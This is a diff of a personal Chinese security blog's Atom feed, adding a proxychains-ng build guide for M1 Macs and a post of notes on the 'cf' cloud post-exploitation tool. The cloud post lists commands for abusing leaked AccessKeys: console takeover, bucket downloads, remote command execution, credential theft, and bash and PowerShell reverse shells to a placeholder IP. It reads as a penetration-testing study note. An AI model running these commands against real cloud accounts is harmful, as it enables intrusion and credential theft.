@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">Klear·blog</title>
     <subtitle type="html">Klear的生活记录&amp;&amp;工作记录。</subtitle>
-    <updated>2023-05-29T14:39:53&#43;08:00</updated>
+    <updated>2023-07-07T22:38:32&#43;08:00</updated>
     <id>https://klearcc.github.io/</id>
     <link rel="alternate" type="text/html" href="https://klearcc.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://klearcc.github.io/atom.xml" />
@@ -16,6 +16,280 @@
             </author>
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
     <generator uri="https://gohugo.io/" version="0.103.1">Hugo</generator>
+        <entry>
+            <title type="text">m1 使用proxychains</title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/m1%E4%BD%BF%E7%94%A8proxychains/" />
+            <id>https://klearcc.github.io/post/m1%E4%BD%BF%E7%94%A8proxychains/</id>
+            <updated>2023-07-07T22:38:28&#43;08:00</updated>
+            <published>2023-07-07T20:53:48&#43;08:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">20230707修改 git clone https://github.com/rofl0r/proxychains-ng.git cd ./proxychains-ng make clean CFLAGS=&amp;#34;-arch x86_64 -arch=arm64e&amp;#34;……</summary>
+            
+                <content type="html">&lt;h2 id=&#34;20230707修改&#34;&gt;20230707修改&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/rofl0r/proxychains-ng.git
+cd ./proxychains-ng
+
+make clean
+CFLAGS=&amp;#34;-arch x86_64 -arch=arm64e&amp;#34; LDFLAGS=&amp;#34;-arch x86_64 -arch=arm64e&amp;#34; ./configure
+sudo make install
+sudo make install-config 
+
+#配置文件，即/usr/local/etc/proxychains.conf文件
+#最后一行配置代理，其他不用动
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202307072238866.png&#34; alt=&#34;image-20230707223825787&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;以下失效&#34;&gt;以下失效&lt;/h2&gt;
+&lt;p&gt;m1直接使用brew安装proxychains-ng会报错&lt;/p&gt;
+&lt;p&gt;解决过程：&lt;/p&gt;
+&lt;p&gt;github下载源码自己编译。&lt;/p&gt;
+&lt;p&gt;禁用sip，百度...不写&lt;/p&gt;
+&lt;p&gt;下载proxychains-ng &lt;a href=&#34;https://github.com/rofl0r/proxychains-ng&#34;&gt;https://github.com/rofl0r/proxychains-ng&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;解压　　tar -xvf proxychainsxxxxxx&lt;/p&gt;
+&lt;p&gt;重点来了 ，三次编译&lt;/p&gt;
+&lt;p&gt;第一次编译：
+cd proxychains-ng-4.16
+make clean
+CFLAGS=&amp;quot;-arch arm64e&amp;quot; LDFLAGS=&amp;quot;-arch arm64e&amp;quot;
+./configure
+make
+将libproxychains4.dylib复制到新建一个bak目录下
+mkdir bak
+cp libproxychains4.dylib ./bak&lt;/p&gt;
+&lt;p&gt;第二次编译：
+make clean
+CFLAGS=&amp;quot;-arch arm64e&amp;quot; LDFLAGS=&amp;quot;-arch arm64e&amp;quot;
+./configure
+make
+将libproxychains4.dylib复制到bak目录下，覆盖
+cp libproxychains4.dylib ./bak&lt;/p&gt;
+&lt;p&gt;第三次编译：
+make clean
+CFLAGS=&amp;quot;-arch arm64&amp;quot; LDFLAGS=&amp;quot;-arch arm64&amp;quot;
+./configure
+sudo make install
+使用install.sh复制./bak/libproxychains4.dylib 到/usr/local/lib/目录
+sudo ./tools/install.sh -D -m 644 bak/libproxychains4.dylib /usr/local/lib/libproxychains4.dylib&lt;/p&gt;
+&lt;p&gt;配置文件在/etc/proxychains.conf
+sudo vi /etc/proxychains.conf&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        <entry>
+            <title type="text">云安全初探</title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/oss-cf/" />
+            <id>https://klearcc.github.io/post/oss-cf/</id>
+            <updated>2023-07-01T18:25:24&#43;08:00</updated>
+            <published>2023-06-28T19:25:27&#43;08:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">云安全初探 扫盲 术语 Bucuket：存储空……</summary>
+            
+                <content type="html">&lt;h1 id=&#34;云安全初探&#34;&gt;云安全初探&lt;/h1&gt;
+&lt;h2 id=&#34;扫盲&#34;&gt;扫盲&lt;/h2&gt;
+&lt;h3 id=&#34;术语&#34;&gt;术语&lt;/h3&gt;
+&lt;h4 id=&#34;bucuket存储空间桶&#34;&gt;Bucuket：存储空间、桶。&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;名称全局唯一，创建之后名称无法修改&lt;/li&gt;
+&lt;li&gt;每个用户可以有多个bucket&lt;/li&gt;
+&lt;li&gt;内部是扁平的，没有目录等概念，简单理解为一个个entry&lt;/li&gt;
+&lt;li&gt;所有对象隶属于对应的bucket，对象数量无限&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;object-对象&#34;&gt;Object: 对象&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;object被称为OSS的文件&lt;/li&gt;
+&lt;li&gt;其由元信息Object Meta、用户数据Data和文件名Key组成。由bucket内唯一的key来标识。&lt;/li&gt;
+&lt;li&gt;可以覆盖上传同名对象，从而实现文件修改。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;objectkey上传的object所在bucket的完整名称&#34;&gt;ObjectKey：上传的Object所在bucket的完整名称&lt;/h4&gt;
+&lt;h4 id=&#34;endpointoss对外服务的访问域名&#34;&gt;Endpoint：OSS对外服务的访问域名&lt;/h4&gt;
+&lt;h4 id=&#34;accesskeyak&#34;&gt;AccessKey：AK&lt;/h4&gt;
+&lt;p&gt;OSS使用AccessKeyId和AccessKeySecret对称加密的方式来验证请求的发送者身份&lt;/p&gt;
+&lt;h2 id=&#34;cf&#34;&gt;cf&lt;/h2&gt;
+&lt;h3 id=&#34;目的&#34;&gt;目的&lt;/h3&gt;
+&lt;p&gt;获取AK后的利用&lt;/p&gt;
+&lt;h3 id=&#34;流程以alibaba为例&#34;&gt;流程（以alibaba为例）&lt;/h3&gt;
+&lt;h4 id=&#34;凭证设置&#34;&gt;凭证设置&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;###配置凭证
+cf config		###配置文件位置~/.config/cf/cache.db
+
+###列出凭证
+cf config ls -a 
+
+###删除凭证
+cf config del 
+
+###切换凭证
+cf config sw
+
+###扫描本地配置
+cf config scan 
+
+###各云提供商本地配置文件
+~/.aliyun/config.json
+~/.tccli/*.credential
+~/.aws/credentials
+~/.huaweicloud/credentials
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;查权限&#34;&gt;#查权限&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;###列出当前凭证的权限
+cf alibaba perm
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;列出所有服务oss-ecs-rds&#34;&gt;列出所有服务OSS ECS RDS&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cf alibaba ls 
+	-r 			###指定区域
+	-a 			###所有服务 包括私有区域
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;列出所有区域&#34;&gt;列出所有区域&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cf alibaba regions ecs 
+	-a 
+cf alibaba regions rds 
+
+cf tencent regions cvm 
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;控制台接管&#34;&gt;控制台接管&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;###列出当前凭证的权限
+cf alibaba perm
+
+###接管控制台，其他平台修改名字即可tencent huawei...
+cf alibaba console -u xxx用户名
+
+###查看接管的控制台的信息
+cf alibaba console ls 
+
+###取消接管
+cf alibaba console cancel
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;对象存储&#34;&gt;对象存储&lt;/h4&gt;
+&lt;h5 id=&#34;列出对象存储服务就是列出bucket&#34;&gt;列出对象存储服务，（就是列出bucket）&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;###其他平台 
+cf aws s3 ls
+cf huawei obs ls
+
+###默认会缓存到~/.config/cf/cache.db，刷新的话带上--flushCache 
+
+###列出OSS 对象存储服务
+cf alibaba oss ls   
+	-n 	100				###添加-n参数可以指定获取对象的数量，但是如果第二次执行，需要加--flushCache参数
+	-r 	cn-beijing		###指定区域
+	-b  bucket_name		###指定bucket名字
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;列出bucket里的对象就是列出bucket里的object&#34;&gt;列出bucket里的对象，就是列出bucket里的object&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cf alibaba oss obj ls 
+	-n 	100				###添加-n参数可以指定获取对象的数量，但是如果第二次执行，需要加--flushCache参数
+	-r 	cn-beijing		###指定区域
+	-b  bucket_name		###指定bucket名字
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;下载bucket里的对象&#34;&gt;下载bucket里的对象&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cf alibaba oss obj get 
+	-n 	100				###添加-n参数可以指定获取对象的数量，但是如果第二次执行，需要加--flushCache参数
+	-r 	cn-beijing		###指定区域
+	-b  bucket_name		###指定bucket名字
+	-k  objectName		###指定对象名
+	-o  /tmp/xxx		###指定输出路径
+	
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;弹性计算服务&#34;&gt;弹性计算服务&lt;/h4&gt;
+&lt;h5 id=&#34;列出ecs&#34;&gt;列出ecs&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;###其他平台 
+cf tencent cvm ls 
+cf tencent lh ls 
+cf aws ec2 ls 
+
+
+
+cf alibaba ecs ls 
+	--running 					###正在运行的实例
+	-r 	i-abcdefghijklmn		###指定区域
+	-i 							###指定实例
+	-a 							###遍历阿里云的所有区域，包括私有区域
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;实例上执行命令&#34;&gt;实例上执行命令&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;###其他平台
+cf tencent cvm exec 
+cf tencent lh exec
+
+cf alibaba ecs exec 
+	-c whoami				###指定命令
+	-i i-abcdefghijklmn		###指定某个实例
+	-s ps 					###执行powershell下的命令 -c \$PSVersionTable -s ps
+	-t 120					###执行命令等待的最大事件
+	-f cmd.txt				###执行批量命令，一行一个，顺序执行
+	
+	
+###一键执行三要素，证明成果
+cf alibaba ecs exec -b 
+	-i i-abcdefghijklmn		###指定实例
+cf tencent cvm exec -b 
+cf tencent lh exec -b
+
+
+###获得临时访问凭证
+cf alibaba ecs exec -m
+	 -i 					###指定实例
+cf tencent cvm exec -m
+cf tencent lh exec -m
+//////cf alibaba ecs exec -c &amp;#34;cat ~/.aliyun/config.json&amp;#34;
+
+
+###一键获得用户数据
+cf alibaba ecs exec -u
+	 -i 					###指定实例
+cf tencent cvm exec -u
+cf tencent lh exec -u
+
+
+###反弹shell
+cf alibaba ecs exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn  
+cf tencent cvm exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
+cf tencent lh exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
+默认命令：
+bash -i &amp;gt;&amp;amp; /dev/tcp/123.123.123.123/4444 0&amp;gt;&amp;amp;1
+powershell IEX (New-Object System.Net.Webclient).DownloadString(&amp;#39;https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&amp;#39;);powercat -c 123.123.123.123 -p 4444 -e cmd
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;rds-云数据库&#34;&gt;RDS 云数据库&lt;/h4&gt;
+&lt;h5 id=&#34;列出云数据库&#34;&gt;列出云数据库&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cf alibaba rds ls 
+	-r		###指定区域
+	-i		###指定数据库id
+	-e		###指定数据库类型
+	
+&lt;/code&gt;&lt;/pre&gt;</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" term="云安全" label="云安全" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         <entry>
             <title type="text">fastjson</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/fastjson%E5%BB%B6%E4%BC%B8/" />
@@ -2137,73 +2411,6 @@ typora21年某个版本之后支持图床，选择Picgo&lt;/p&gt;
 自定义域名为jsdelivrCDN，填写规则如图：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202038248.png&#34; alt=&#34;image-20220920203832229&#34;&gt;
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202039972.png&#34; alt=&#34;image-20220920203916950&#34;&gt;&lt;/p&gt;
-</content>
-            
-            
-            
-            
-            
-                
-                    
-                
-                    
-                        
-                            
-                            
-                            
-                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
-                            
-                        
-                    
-                
-            
-        </entry>
-    
-        <entry>
-            <title type="text">m1 使用proxychains</title>
-            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/m1%E4%BD%BF%E7%94%A8proxychains/" />
-            <id>https://klearcc.github.io/post/m1%E4%BD%BF%E7%94%A8proxychains/</id>
-            <updated>2023-02-05T13:17:24&#43;08:00</updated>
-            <published>2022-06-28T20:53:48&#43;08:00</published>
-            <author>
-                    <name>Klear</name>
-                    <uri>https://klearcc.github.io/</uri>
-                    <email>baicaix86@gmail.com</email>
-                    </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">m1直接使用brew安装proxycha……</summary>
-            
-                <content type="html">&lt;p&gt;m1直接使用brew安装proxychains-ng会报错&lt;/p&gt;
-&lt;p&gt;解决过程：&lt;/p&gt;
-&lt;p&gt;github下载源码自己编译。&lt;/p&gt;
-&lt;p&gt;禁用sip，百度...不写&lt;/p&gt;
-&lt;p&gt;下载proxychains-ng &lt;a href=&#34;https://github.com/rofl0r/proxychains-ng&#34;&gt;https://github.com/rofl0r/proxychains-ng&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;解压　　tar -xvf proxychainsxxxxxx&lt;/p&gt;
-&lt;p&gt;重点来了 ，三次编译&lt;/p&gt;
-&lt;p&gt;第一次编译：
-cd proxychains-ng-4.16
-make clean
-CFLAGS=&amp;quot;-arch arm64e&amp;quot; LDFLAGS=&amp;quot;-arch arm64e&amp;quot;
-./configure
-make
-将libproxychains4.dylib复制到新建一个bak目录下
-mkdir bak
-cp libproxychains4.dylib ./bak&lt;/p&gt;
-&lt;p&gt;第二次编译：
-make clean
-CFLAGS=&amp;quot;-arch arm64e&amp;quot; LDFLAGS=&amp;quot;-arch arm64e&amp;quot;
-./configure
-make
-将libproxychains4.dylib复制到bak目录下，覆盖
-cp libproxychains4.dylib ./bak&lt;/p&gt;
-&lt;p&gt;第三次编译：
-make clean
-CFLAGS=&amp;quot;-arch arm64&amp;quot; LDFLAGS=&amp;quot;-arch arm64&amp;quot;
-./configure
-sudo make install
-使用install.sh复制./bak/libproxychains4.dylib 到/usr/local/lib/目录
-sudo ./tools/install.sh -D -m 644 bak/libproxychains4.dylib /usr/local/lib/libproxychains4.dylib&lt;/p&gt;
-&lt;p&gt;配置文件在/etc/proxychains.conf
-sudo vi /etc/proxychains.conf&lt;/p&gt;
 </content>
             
             
